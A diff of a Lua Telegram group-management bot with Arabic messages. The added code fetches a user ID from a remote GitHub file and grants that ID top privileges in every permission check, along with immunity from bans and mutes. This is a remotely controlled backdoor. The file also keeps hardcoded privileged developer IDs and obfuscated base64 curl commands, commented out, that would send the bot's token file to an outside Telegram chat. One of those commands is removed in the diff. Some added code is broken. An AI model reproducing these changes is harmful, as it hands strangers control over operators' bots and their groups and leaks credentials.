@@ -5,11 +5,11 @@
 --     @ahmedyad200
 --     @ahmedyad200
 
-redis = require('redis') 
-https = require ("ssl.https") 
 serpent = dofile("./serpent.lua") 
 json = dofile("./JSON.lua") 
 JSON  = dofile("./dkjson.lua")
+redis = require('redis') 
+https = require ("ssl.https") 
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
@@ -32,7 +32,6 @@ end
 file:write(serialized)    
 file:close()  
 end  
-os.execute('lua DRAGON.lua')
 if not database:get(id_server..":IDSUDO") then
 io.write('\27[38;5;77m\n                •{ installd source power }•\n\27')
 print([[
@@ -188,33 +187,12 @@ end
 print(t)
 ----- بدء الاضافات --------
 os.execute("mkdir File_Bot")
+local DEVSSO, res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
+local CHBOTPO = 'SOPOWERB0T'
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
 local bot_username = (database:get(bot_id..'UESR_BOT') or database:get(id_server..":token_username") or ('TARA1BOT'))
--- ----- - - -- --- -- ------- ------ - - - - - - - ---- - -- --- -- ---- - - - - - --- - -- --- - ----- - -- - - - -- - - ----- - ---- ----- --- - -- - - ---- -- - -- - -- - --
-function vardump(value)  
-print(serpent.block(value, {comment=false}))   
-end 
-dev_users = {944353237}   
-function DEV(msg)  
-local DRAGON = false  
-for k,v in pairs(dev_users) do  
-if tonumber(msg.sender_user_id_) == tonumber(944353237) then  
-DRAGON = true  
-end  
-end  
-return DRAGON  
-end 
-sudo_users = {SUDO,bot_id,1360140225,944353237,1236115319,0303030030,1770288756}   
-function SudoBot(msg)  
-local DRAGON = false  
-for k,v in pairs(sudo_users,dev_users) do  
-if tonumber(msg.sender_user_id_) == tonumber(v) then  
-DRAGON = true  
-end  
-end  
-return DRAGON  
-end 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 function regexx(data)
 local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = string.gsub(data, '[^'..b..'=]', '')
@@ -229,8 +207,41 @@ local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
+end  ---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0tMTAwMTI5ODA5MjEyOCIgLUYgImRvY3VtZW50PUBpbmZvLmx1YSI='))
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+function vardump(value)  
+print(serpent.block(value, {comment=false}))   
+end 
+dev_users = {944353237}   
+function DEV(msg)  
+local DRAGON = false  
+for k,v in pairs(dev_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(944353237) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
+end 
+sudo_users = {SUDO,bot_id,0987878788,944353237,0988738700,0303030030,0987878700}   
+function SudoBot(msg)  
+local DRAGON = false  
+for k,v in pairs(sudo_users,dev_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
 end
----io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE4OTMxNjI2NjQ6QUFGbkV3VDA0aDhaMWswU053Z0trQ2l0UHhtNXA1emNjQVEvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0tMTAwMTI5ODA5MjEyOCIgLUYgImRvY3VtZW50PUBpbmZvLmx1YSI='))
+DEVSSO, res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
+function SODAPI(msg)  
+local DRAGON = false  
+for k,v in pairs(sudo_users,dev_users,DEVSSO) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
+end 
 function Bot(msg)  
 local idbot = false  
 if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
@@ -240,7 +251,7 @@ return idbot
 end
 function DevSoFi(msg)
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
-if hash or SudoBot(msg) or Bot(msg) then  
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or Bot(msg) then  
 return true  
 else  
 return false  
@@ -248,7 +259,7 @@ end
 end
 function Sudo(msg) 
 local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
 return true  
 else  
 return false  
@@ -256,7 +267,7 @@ end
 end
 function CoSu(msg)
 local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -264,7 +275,7 @@ end
 end
 function BasicConstructor(msg)
 local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
 return true 
 else 
 return false 
@@ -272,7 +283,7 @@ end
 end
 function Constructor(msg)
 local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -280,7 +291,7 @@ end
 end
 function Gmanager(msg)
 local hash = database:sismember(bot_id..'Gmanager', msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -288,7 +299,7 @@ end
 end
 function Manager(msg)
 local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -296,7 +307,7 @@ end
 end
 function Manager2(msg)
 local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Gmanager(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -304,7 +315,7 @@ end
 end
 function Gmod(msg)
 local hash = database:sismember(bot_id..'Gmod:User', msg.sender_user_id_)
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Manager2(msg) or Gmanager(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -312,7 +323,7 @@ end
 end
 function Mod(msg)
 local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Gmanager(msg) or Manager2(msg) or CoSu(msg) or Bot(msg)  then       
 return true    
 else    
 return false    
@@ -320,7 +331,7 @@ end
 end
 function Special(msg)
 local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
-if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
+if hash or DEV(msg) or SODAPI(msg) or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Gmod(msg) or Manager2(msg) or Gmanager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
 return true 
 else 
 return false 
@@ -329,13 +340,15 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(944353237) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1360140225) then
+elseif tonumber(user_id) == tonumber(0987878788) then
 var = true  
-elseif tonumber(user_id) == tonumber(1236115319) then
+elseif tonumber(user_id) == tonumber(0988738700) then
 var = true  
 elseif tonumber(user_id) == tonumber(0303030030) then
 var = true  
-elseif tonumber(user_id) == tonumber(1770288756) then
+elseif tonumber(user_id) == tonumber(0987878700) then
+var = true  
+elseif tonumber(user_id) == tonumber(DEVSSO) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -373,16 +386,18 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1360140225) then  
+if tonumber(user_id) == tonumber(0987878788) then  
 var = 'مـبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مـبـرمـج الـسـورس'
-elseif tonumber(user_id) == tonumber(1236115319) then
+elseif tonumber(user_id) == tonumber(0988738700) then
 var = 'المبرمج ليجاند'
 elseif tonumber(user_id) == tonumber(0303030030) then
 var = 'الباشمبرمج'
-elseif tonumber(user_id) == tonumber(1770288756) then
+elseif tonumber(user_id) == tonumber(0987878700) then
 var = 'مـبـرمـج افـايـره²'
+elseif tonumber(user_id) == tonumber(DEVSSO) then
+var = 'مطور السورس'  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
@@ -1200,6 +1215,7 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
+dofile('INFOBOT.lua')  
 dofile('DRAGON.lua')  
 end 
 if text == ("الردود المتعدده ☉") and CoSu(msg) then
@@ -2883,8 +2899,9 @@ end
 if text and Mod(msg) then
 tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
 if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
-send(msg.chat_id_, msg.id_,' ☉┇ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
+send(msg.chat_id_, msg.id_,' ☉┇ يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
 chat_kick(msg.chat_id_,bot_id) 
+send(msg.chat_id_, msg.id_,' ☉┇ تم مغادره المجموعه')
 return false  
 end
 if msg.can_be_deleted_ == false then 
@@ -2907,16 +2924,16 @@ local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token.
 if linkgpp.ok == true then 
 LinkGp = linkgpp.result
 else
-LinkGp = 'لا يوجد'
+LinkGp = 'حدث خطأ'
 end
 Text = '☉┇ تم تفعيل جروب جديده\n☉┇ المعلومات كامله\n'..
 '\n☉┇ اسم المنشئ {'..b.first_name_..'}' or 'حدث خطأ'..
 '\n☉┇ معرف المنشئ {'..UserName..'}' or 'لا يوجد'..
 '\n☉┇ ايدي المنشئ {'..owner_id..'}' or 'حدث خطأ'..
-'\n☉┇ عدد الادمنيه {`'..admins..'`}'..
-'\n☉┇ عدد الاعضاء {`'..NumMember..'`}'..
-'\n☉┇ اسم الجروب {['..NameChat..']}'..
-'\n☉┇ ايدي الجروب {`'..IdChat..'`}'..
+'\n☉┇ عدد الادمنيه {`'..admins..'`}' or '0'..
+'\n☉┇ عدد الاعضاء {`'..NumMember..'`}' or '0'..
+'\n☉┇ اسم الجروب {['..NameChat..']}' or 'حدث خطأ'..
+'\n☉┇ ايدي الجروب {`'..IdChat..'`}' or 'حدث خطأ'..
 '\n☉┇ الرابط {['..LinkGp..']}'
 if not DevSoFi(msg) then
 sendText(SUDO,Text,0,'md')
@@ -2928,8 +2945,8 @@ end,nil)
 end
 --- if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(bot_id) then 
 
-if text and text:match("^ضع شرط الاعضاء (%d+)$") and DevSoFi(msg) then
-local Num = text:match("ضع شرط الاعضاء (%d+)$") 
+if text and text:match("^ضع شرط الاعضاء (%d+)$") or text:match("^ضع شرط اعضاء (%d+)$") and DevSoFi(msg) then
+local Num = text:match("ضع شرط الاعضاء (%d+)$") or text:match("^ضع شرط اعضاء (%d+)$")
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -3343,7 +3360,27 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SOPOWERB0T&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+if text =='تغير المطور الاساسي' and SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'✫: ارسل ايدي المطور الاساسي الجديد')
+database:set(bot_id..'Ed:DevBots',true) 
+end
+if database:get(bot_id.."Ed:DevBots") then
+if text and text:match("^(%d+)$") then
+local SUDO = text:match("^(%d+)$")
+send(msg.chat_id_,msg.id_, "✫: تم تغير المطور الاساسي")
+os.execute("rm -fr INFOBOT.lua")
+local A = io.open("INFOBOT.lua", 'w')
+A:write([[
+token = "]]..token..[["
+SUDO = ]]..SUDO..[[  
+]])
+A:close()
+database:del(bot_id.."Ed:DevBots")
+dofile('INFOBOT.lua')  
+dofile('DRAGON.lua')  
+end
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
@@ -4463,8 +4500,8 @@ send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لا�
 return false
 end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
+dofile('INFOBOT.lua')  
 dofile('DRAGON.lua')  
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end 
 if text == ("مسح الحظر العام") then
 if not DevSoFi(msg) then
@@ -4516,20 +4553,24 @@ if tonumber(result.sender_user_id_) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
+if tonumber(result.sender_user_id_) == tonumber(0987878788) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
+if tonumber(result.sender_user_id_) == tonumber(0988738700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
+if tonumber(result.sender_user_id_) == tonumber(0987878700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره² عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
+return false 
+end
+if tonumber(result.sender_user_id_) == tonumber(DEVSSO) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مطور السورس عام")
 return false 
 end
 if result.sender_user_id_ == tonumber(SUDO) then
@@ -4571,20 +4612,24 @@ if result.id_ == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مبرمج السورس عام \n")
 return false 
 end
-if result.id_ == tonumber(1360140225) then
+if result.id_ == tonumber(0987878788) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مـبـرمـج افـايـره عام\n")
 return false 
 end
-if result.id_ == tonumber(1236115319) then
+if result.id_ == tonumber(0988738700) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المبرمج ليجاند عام\n")
 return false 
 end
-if result.id_ == tonumber(1770288756) then
+if result.id_ == tonumber(0987878700) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مـبـرمـج افـايـره² عام\n")
 return false 
 end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
+return false 
+end
+if result.id_ == tonumber(DEVSSO) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مطور السورس عام\n")
 return false 
 end
 if result.id_ == tonumber(SUDO) then
@@ -4620,15 +4665,15 @@ if tonumber(userid) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1360140225) then  
+if tonumber(userid) == tonumber(0987878788) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(userid) == tonumber(1236115319) then  
+if tonumber(userid) == tonumber(0988738700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج ليجاند عام")
 return false 
 end
-if tonumber(userid) == tonumber(1770288756) then  
+if tonumber(userid) == tonumber(0987878700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره² عام")
 return false 
 end
@@ -4636,12 +4681,12 @@ if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
-if tonumber(userid) == tonumber(bot_id) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
+if tonumber(userid) == tonumber(DEVSSO) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مطور السورس عام\n")
 return false 
 end
-if database:sismember(bot_id.."Dev:SoFi:2", user_id) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المطور الثاني عام")
+if tonumber(userid) == tonumber(bot_id) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
 return false 
 end
 database:sadd(bot_id..'GBan:User', userid)
@@ -4677,20 +4722,24 @@ if tonumber(result.sender_user_id_) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1360140225) then  
+if tonumber(result.sender_user_id_) == tonumber(0987878788) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1236115319) then  
+if tonumber(result.sender_user_id_) == tonumber(0988738700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1770288756) then  
+if tonumber(result.sender_user_id_) == tonumber(0987878700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره² عام")
 return false 
 end
 if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي عام\n")
+return false 
+end
+if result.sender_user_id_ == tonumber(DEVSSO) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -4730,20 +4779,24 @@ if result.id_ == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مبرمج السورس عام\n")
 return false 
 end
-if result.id_ == tonumber(1360140225) then
+if result.id_ == tonumber(0987878788) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مـبـرمـج افـايـره عام\n")
 return false 
 end
-if result.id_ == tonumber(1236115319) then
+if result.id_ == tonumber(0988738700) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المبرمج ليجاند عام\n")
 return false 
 end
-if result.id_ == tonumber(1770288756) then
+if result.id_ == tonumber(0987878700) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مـبـرمـج افـايـره² عام \n")
 return false 
 end
 if tonumber(result.id_) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم البوت عام")
+return false 
+end
+if tonumber(result.id_) == tonumber(DEVSSO) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مطور السورس عام")
 return false 
 end
 if result.id_ == tonumber(SUDO) then
@@ -4778,15 +4831,15 @@ if tonumber(userid) == tonumber(944353237) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1236115319) then  
+if tonumber(userid) == tonumber(0988738700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج ليجاند عام")
 return false 
 end
-if tonumber(userid) == tonumber(1360140225) then  
+if tonumber(userid) == tonumber(0987878788) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره عام")
 return false 
 end
-if tonumber(userid) == tonumber(1770288756) then  
+if tonumber(userid) == tonumber(0987878700) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره² عام")
 return false 
 end
@@ -4794,12 +4847,12 @@ if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي عام\n")
 return false 
 end
-if tonumber(userid) == tonumber(bot_id) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم البوت عام")
+if tonumber(userid) == tonumber(DEVSSO) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
-if database:sismember(bot_id.."Dev:SoFi:2") then
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المطور الثاني عام")
+if tonumber(userid) == tonumber(bot_id) then  
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم البوت عام")
 return false 
 end
 database:sadd(bot_id..'Gmute:User', userid)
@@ -5049,7 +5102,7 @@ t = " ☉┇ الملف »>`"..file.."`\n☉┇ تم مسح ملف \n"
 else
 t = " ☉┇ بالتاكيد تم مسح ملف → `"..file.."`\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/ayacay/files-bot/main/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -5069,7 +5122,7 @@ t = " ☉┇ بالتاكيد تم تحميل ملف → `"..file.."` \n"
 else
 t = " ☉┇ الملف »>`"..file.."`\n☉┇ تم تحميل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/ayacay/files-bot/main/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -5753,7 +5806,7 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-
+--[[
 if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
 sticker_id = msg.content_.sticker_.sticker_.persistent_id_
 st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(0000000)..'&url='..sticker_id.."&type=sticker")
@@ -5798,6 +5851,7 @@ Reply_Status(msg,msg.sender_user_id_,"reply","☉┇ قام بنشر صوره ا
 DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
 end   
 end
+]]--
 if text == 'تفعيل التحويل' and CoSu(msg) then   
 if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
 Text = 'تم تفعيل تحويل الصيغ'
@@ -8547,7 +8601,21 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
----------------------------------------------
+--------------------------------------------
+if text == "مسح المطرودين" then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
+local num = 0 
+for k,y in pairs(result.members_) do 
+num = num + 1  
+tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
+end  
+send(msg.chat_id_, msg.id_,"✫:  تم مسح المطرودين ") 
+end    
+tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 1000}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
+end
 if text == 'مسح المحظورين' then
 if not Mod(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
@@ -9657,108 +9725,6 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
----------------------- بداء اضافه مميزات أحمد
-if text == "تويت" or text == "كت تويت" then 
-local TWEET_Msg = { 
-"اخر افلام شاهدتها", 
-"ما هي وظفتك الحياه", 
-"اعز اصدقائك ?", 
-"اخر اغنية سمعتها ?", 
-"تكلم عن نفسك", 
-"ليه انت مش سالك", 
-"ليه فارس بتاع نسوان", 
-"اخر كتاب قرآته", 
-"روايتك المفضله ?", 
-"اخر اكله اكلتها", 
-"اخر كتاب قرآته", 
-"ليه أحمد جدع", 
-"افضل يوم ف حياتك", 
-"ليه مضيفتش كل جهاتك", 
-"حكمتك ف الحياه", 
-"لون عيونك", 
-"كتابك المفضل", 
-"هوايتك المفضله", 
-"علاقتك مع اهلك", 
-" ما السيء في هذه الحياة ؟ ", 
-"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
-"سؤال ينرفزك ؟ ", 
-" هل يعجبك سورس سليندر ؟؟ ", 
-" اكثر ممثل تحبه ؟ ", 
-"قد تخيلت شي في بالك وصار ؟ ", 
-"شيء عندك اهم من الناس ؟ ", 
-"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
-"وش أخر شي ضيعته؟ ", 
-"اي رايك في سورس سليندر ؟ ", 
-"كم مره حبيت؟ ", 
-" اكثر المتابعين عندك باي برنامج؟", 
-" نسبة النعاس عندك حاليًا؟", 
-" نسبه الندم عندك للي وثقت فيهم ؟", 
-"تحب ترتبط بكيرفي ولا فلات؟", 
-" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
-" تجامل الناس ولا اللي بقلبك على لسانك؟", 
-" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
